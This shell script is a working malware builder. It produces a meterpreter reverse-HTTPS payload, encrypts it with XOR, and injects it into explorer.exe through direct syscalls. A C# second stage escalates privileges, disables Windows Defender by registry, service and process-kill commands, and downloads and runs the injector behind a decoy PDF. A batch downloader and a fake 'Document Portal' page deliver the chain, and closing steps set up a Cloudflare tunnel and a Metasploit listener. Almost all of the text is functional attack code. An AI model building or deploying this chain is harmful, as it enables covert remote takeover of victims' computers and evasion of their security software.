#!/bin/bash
# pgen_auto.sh - Fully automated payload generator (self‑contained)
# Usage: ./pgen_auto.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v] [--key HEX_KEY] [--port PORT]
# Requirements:
#   - SysWhispers2 directory with compiled syscall stubs (syscalls.c, syscallsstubs.std.x64.nasm, etc.) in ../SysWhispers2/
#   - All dependencies: mcs, nasm, mingw-w64, msfvenom, etc.

set -e

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# Defaults
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH="/generated"
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
OUTPUT_DIR="./generated"
VISIBLE_MODE=0

# Paths (adjust if needed)
SYSCALLS_DIR="../SysWhispers2"          # location of syscalls files
STAGE3_OUTPUT="$SYSCALLS_DIR/stage3.exe"

show_usage() {
    echo -e "${YELLOW}Usage: $0 -t <tunnel> -u <url> [-v] [--key HEX_KEY] [--port PORT]${NC}"
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option $1${NC}"; show_usage ;;
    esac
done

[ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ] && show_usage

WEB_URL="${WEB_URL%/}"
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

echo -e "${GREEN}[✓] Tunnel: $TUNNEL_HOST${NC}"
echo -e "${GREEN}[✓] Full URL: $FULL_BASE_URL${NC}"
echo -e "${GREEN}[✓] XOR Key: $XOR_KEY_DEC${NC}"
echo -e "${GREEN}[✓] Mode: $([ $VISIBLE_MODE -eq 1 ] && echo VISIBLE || echo STEALTH)${NC}"

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR"

B64_URL=$(echo -n "$FULL_BASE_URL" | base64 -w 0)
B64_KEY=$(echo -n "$XOR_KEY_DEC" | base64 -w 0)

# ========== STEP 1: Generate raw payload with msfvenom ==========
echo -e "${YELLOW}[1/7] Generating raw shellcode...${NC}"
LHOST_IP=$(dig +short "$TUNNEL_HOST" | head -n1)
[ -z "$LHOST_IP" ] && LHOST_IP="104.16.231.132"
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="$TUNNEL_HOST" LPORT="$PAYLOAD_PORT" -f raw -o output/payload.raw
if [ ! -f output/payload.raw ]; then
    echo -e "${RED}✗ msfvenom failed${NC}"
    exit 1
fi

# ========== STEP 2: XOR encrypt ==========
echo -e "${YELLOW}[2/7] XOR encrypting payload...${NC}"
python3 -c "
import sys
with open('output/payload.raw', 'rb') as f:
    data = f.read()
key = $XOR_KEY_DEC
enc = bytes([b ^ key for b in data])
with open('payload.enc', 'wb') as f:
    f.write(enc)
with open('payload.enc.b64', 'w') as f:
    import base64
    f.write(base64.b64encode(enc).decode())
print('✓ Encrypted {} bytes -> payload.enc'.format(len(data)))
"

# ========== STEP 3: Convert payload.enc to C array ==========
echo -e "${YELLOW}[3/7] Converting to C array...${NC}"
xxd -i payload.enc > payload_hex.txt
ARRAY_CONTENT=$(sed -n '/{/,/}/p' payload_hex.txt | sed 's/^[[:space:]]*//' | tr -d '\n' | sed 's/,$//')

# ========== STEP 4: Generate stage3.cpp (self‑contained) ==========
echo -e "${YELLOW}[4/7] Generating stage3.cpp...${NC}"
cat > stage3.cpp <<EOF
// stage3.cpp - Direct Syscall Injection Loader (auto‑generated)
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "syscalls.h"

const BYTE g_XorKey = $XOR_KEY_DEC;

unsigned char encryptedShellcode[] = { $ARRAY_CONTENT };
const SIZE_T g_ShellcodeSize = sizeof(encryptedShellcode);

void Log(const char* message) {
    try {
        char logPath[MAX_PATH];
        GetTempPathA(MAX_PATH, logPath);
        strcat(logPath, "stage3b_debug.txt");
        FILE* f = fopen(logPath, "a");
        if (f) {
            SYSTEMTIME st;
            GetLocalTime(&st);
            fprintf(f, "%02d:%02d:%02d - %s\n", st.wHour, st.wMinute, st.wSecond, message);
            fclose(f);
        }
    } catch (...) {}
}

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

void DecryptShellcode(BYTE* shellcode, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        shellcode[i] ^= key;
    }
}

int main() {
    Log("=== Stage3b started ===");

    DecryptShellcode(encryptedShellcode, g_ShellcodeSize, g_XorKey);
    Log("Shellcode decrypted.");

    const wchar_t* targetProcess = L"explorer.exe";
    DWORD pid = GetProcessIdByName(targetProcess);
    if (pid == 0) {
        Log("Target process not found.");
        return 1;
    }
    char pidMsg[64];
    sprintf(pidMsg, "Target PID: %d", pid);
    Log(pidMsg);

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    NTSTATUS status;

    status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (status != 0) {
        char errMsg[128];
        sprintf(errMsg, "NtOpenProcess failed: 0x%08X", status);
        Log(errMsg);
        return 1;
    }
    Log("Process opened.");

    LPVOID remoteMemory = NULL;
    SIZE_T regionSize = g_ShellcodeSize;
    status = NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &regionSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        char errMsg[128];
        sprintf(errMsg, "NtAllocateVirtualMemory failed: 0x%08X", status);
        Log(errMsg);
        NtClose(hProcess);
        return 1;
    }
    char memMsg[128];
    sprintf(memMsg, "Memory allocated at 0x%p", remoteMemory);
    Log(memMsg);

    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, remoteMemory, encryptedShellcode,
                                  g_ShellcodeSize, &bytesWritten);
    if (status != 0 || bytesWritten != g_ShellcodeSize) {
        char errMsg[128];
        sprintf(errMsg, "NtWriteVirtualMemory failed: 0x%08X", status);
        Log(errMsg);
        NtClose(hProcess);
        return 1;
    }
    char writeMsg[64];
    sprintf(writeMsg, "Shellcode written (%zu bytes).", bytesWritten);
    Log(writeMsg);

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                              remoteMemory, NULL,
                              FALSE, 0, 0, 0, NULL);
    if (status != 0) {
        char errMsg[128];
        sprintf(errMsg, "NtCreateThreadEx failed: 0x%08X", status);
        Log(errMsg);
    } else {
        Log("Remote thread created – shellcode is running!");
        NtClose(hThread);
    }

    NtClose(hProcess);
    Log("=== Stage3b finished ===");
    return 0;
}
EOF

# Show first few lines to verify
echo -e "${GREEN}First 10 lines of stage3.cpp:${NC}"
head -10 stage3.cpp

# ========== STEP 5: Compile stage3.exe ==========
echo -e "${YELLOW}[5/7] Compiling stage3.exe...${NC}"
cp stage3.cpp "$SYSCALLS_DIR/"
cd "$SYSCALLS_DIR"
nasm -f win64 -o syscallsstubs.std.x64.o syscallsstubs.std.x64.nasm
x86_64-w64-mingw32-g++ -static -o stage3.exe stage3.cpp syscalls.c syscallsstubs.std.x64.o -I.
if [ ! -f stage3.exe ]; then
    echo -e "${RED}✗ Compilation failed${NC}"
    exit 1
fi
echo -e "${GREEN}✓ stage3.exe compiled successfully${NC}"
cd - >/dev/null

# ========== STEP 6: Copy stage3.exe ==========
echo -e "${YELLOW}[6/7] Copying stage3.exe to payloads/...${NC}"
cp "$SYSCALLS_DIR/stage3.exe" payloads/stage3b.exe
echo -e "${GREEN}✓ stage3b.exe copied${NC}"

# ========== STEP 7: Create tools and C# stage2 loader ==========
echo -e "${YELLOW}[7/7] Creating tools and stage2 loader...${NC}"
mkdir -p tools

# generate_payload.sh (placeholder)
cat > tools/generate_payload.sh <<EOF
#!/bin/bash
# placeholder
EOF
chmod +x tools/generate_payload.sh

# xor_encrypt.py (kept for compatibility)
cat > tools/xor_encrypt.py <<EOF
#!/usr/bin/env python3
import sys, base64
def xor_encrypt(inf, outf, key):
    with open(inf,'rb') as f: data = f.read()
    enc = bytes([b ^ key for b in data])
    with open(outf,'wb') as f: f.write(enc)
    with open(outf+'.b64','w') as f: f.write(base64.b64encode(enc).decode())
    print(f"✓ Encrypted {len(data)} bytes -> {outf}")
if __name__=="__main__":
    if len(sys.argv)<4: print("Usage: xor_encrypt.py <in> <out> <key>"); sys.exit(1)
    xor_encrypt(sys.argv[1], sys.argv[2], int(sys.argv[3]))
EOF
chmod +x tools/xor_encrypt.py

# stage2.cs (final version with Defender disable)
cat > tools/stage2.cs <<'EOF'
using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Security.Principal;

namespace Stage2
{
    class Program
    {
        static void Log(string message)
        {
            try {
                File.AppendAllText(Path.GetTempPath() + "stage2_log.txt",
                    DateTime.Now.ToString("HH:mm:ss") + " - " + message + Environment.NewLine);
            } catch { }
        }

        static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        static int RunProcess(string fileName, string arguments, out string output, bool wait = true)
        {
            output = "";
            try {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = fileName;
                psi.Arguments = arguments;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi))
                {
                    if (wait)
                    {
                        output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit(30000);
                        return p.ExitCode;
                    }
                    else return 0;
                }
            } catch (Exception ex) {
                output = ex.Message;
                return -1;
            }
        }

        static void Main()
        {
            Log("=== Stage2 started ===");
            if (!IsAdministrator())
            {
                Log("Not running as administrator. Attempting to elevate...");
                try {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = Process.GetCurrentProcess().MainModule.FileName;
                    psi.UseShellExecute = true;
                    psi.Verb = "runas";
                    Process.Start(psi);
                } catch {
                    Log("Elevation failed. Exiting.");
                }
                return;
            }
            Log("Running with administrator privileges.");

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                Log("TLS configured");

                Log("Starting Defender disable procedure...");
                // Tamper protection
                int tpResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features' -Name 'TamperProtection' -Value 0 -Force\"", out string tpOut);
                Log("Tamper protection registry result: " + tpResult + " - " + tpOut);
                Thread.Sleep(3000);

                // Real-time monitoring
                int mpResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"", out string mpOut);
                Log("Set-MpPreference result: " + mpResult + " - " + mpOut);
                Thread.Sleep(5000);

                // Temp folder exclusion
                int exclResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Add-MpPreference -ExclusionPath $env:TEMP\"", out string exclOut);
                Log("Exclusion added: " + exclResult + " - " + exclOut);

                // SC stop
                int scStop = RunProcess("sc.exe", "stop WinDefend", out string scStopOut);
                Log("SC stop result: " + scStop + " - " + scStopOut);
                Thread.Sleep(5000);
                int scConfig = RunProcess("sc.exe", "config WinDefend start= disabled", out string scConfigOut);
                Log("SC config result: " + scConfig + " - " + scConfigOut);

                // Fallback registry disable
                if (scStop != 0 || scConfig != 0)
                {
                    Log("SC commands failed, trying registry method...");
                    int regDisable = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend' -Name 'Start' -Value 4 -Force\"", out string regDisableOut);
                    Log("Registry disable result: " + regDisable + " - " + regDisableOut);
                    RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Force\"", out string _);
                }

                // Kill MsMpEng
                try {
                    foreach (var proc in Process.GetProcessesByName("MsMpEng"))
                    {
                        proc.Kill();
                        Log("MsMpEng.exe killed.");
                    }
                } catch (Exception ex) {
                    Log("Error killing MsMpEng: " + ex.Message);
                }

                // Verify Defender status
                bool defenderRunning = true;
                int retries = 0;
                while (defenderRunning && retries < 10)
                {
                    int checkResult = RunProcess("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"if ((Get-Service WinDefend -ErrorAction SilentlyContinue).Status -eq 'Running') { exit 1 } else { exit 0 }\"", out string checkOut);
                    if (checkResult == 0)
                    {
                        defenderRunning = false;
                        Log("WinDefend is stopped.");
                    }
                    else
                    {
                        Log("WinDefend still running, waiting 10 more seconds... (attempt " + (retries+1) + ")");
                        Thread.Sleep(10000);
                        retries++;
                    }
                }
                if (defenderRunning)
                    Log("Warning: Defender may still be active, but exclusions should allow execution...");

                // Download and run stage3b.exe
                WebClient client = new WebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                string url = "FULL_BASE_URL_PLACEHOLDER/payloads/stage3b.exe";
                string path = Path.GetTempPath() + "stage3b.exe";
                Log("Downloading stage3b from: " + url);
                client.DownloadFile(url, path);
                Log("Downloaded stage3b.exe, executing...");
                Process.Start(path);
                Log("stage3b.exe launched");

                // Decoy PDF
                client.DownloadFile("FULL_BASE_URL_PLACEHOLDER/decoy.pdf", "decoy.pdf");
                Process.Start("decoy.pdf");
                Log("Decoy PDF opened");
            }
            catch (Exception ex)
            {
                Log("ERROR: " + ex.Message);
                if (ex.InnerException != null)
                    Log("INNER ERROR: " + ex.InnerException.Message);
            }
            Log("=== Stage2 finished ===");
        }
    }
}
EOF

# Replace placeholder in stage2.cs
sed -i "s|FULL_BASE_URL_PLACEHOLDER|$FULL_BASE_URL|g" tools/stage2.cs

# Compile stage2.exe
if command -v mcs >/dev/null 2>&1; then
    mcs -target:exe -out:payloads/stage2.exe tools/stage2.cs
    echo -e "${GREEN}✓ stage2.exe compiled${NC}"
else
    echo -e "${RED}✗ mcs not found. Install mono-mcs.${NC}"
    exit 1
fi

# ========== STEP 8: Create stage1.bat, decoy.pdf, index.html ==========
echo -e "${YELLOW}[8/8] Creating web files...${NC}"
cat > payloads/stage1.bat <<'EOF'
@echo off
title Stage1 Payload Loader (EXE)
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell start -verb runas '%0'
    exit /b
)
echo Running with administrator privileges.
echo [!] Downloading stage2.exe from FULL_BASE_URL_PLACEHOLDER/payloads/stage2.exe
echo %date% %time% - Starting download > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('FULL_BASE_URL_PLACEHOLDER/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist %TEMP%\stage2.exe (
    echo [✓] stage2.exe downloaded, executing...
    echo %date% %time% - stage2.exe downloaded successfully >> %TEMP%\stage1_log.txt
    start /B %TEMP%\stage2.exe
) else (
    echo [✗] Download failed
    echo %date% %time% - Download failed >> %TEMP%\stage1_log.txt
)
echo [2] Opening decoy.pdf...
echo %date% %time% - Downloading decoy.pdf >> %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('FULL_BASE_URL_PLACEHOLDER/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
EOF
sed -i "s|FULL_BASE_URL_PLACEHOLDER|$FULL_BASE_URL|g" payloads/stage1.bat

echo "This document requires a viewer update." > decoy.pdf
cat > index.html <<EOF
<!DOCTYPE html><html><head><title>Document Portal</title></head>
<body><h1>Document Portal</h1><p>Server: $FULL_BASE_URL</p><p>Tunnel: $TUNNEL_HOST</p>
<ul><li><a href="payloads/stage1.bat">Download stage1.bat</a></li></ul></body></html>
EOF

# ========== FINAL OUTPUT ==========
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ ALL DONE! Files created in $OUTPUT_DIR${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo "Files ready for $FULL_BASE_URL:"
ls -la payload.enc decoy.pdf payloads/stage2.exe payloads/stage3b.exe payloads/stage1.bat index.html
echo ""
echo "Next steps:"
echo "1. Upload all files to $FULL_BASE_URL"
echo "2. Start cloudflared tunnel: cloudflared tunnel --url tcp://localhost:4444 --protocol http2"
echo "3. Start Metasploit handler: msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter_reverse_https; set LHOST 127.0.0.1; set LPORT 4444; exploit -j'"
echo "4. On Windows VM, download and run: $FULL_BASE_URL/payloads/stage1.bat"
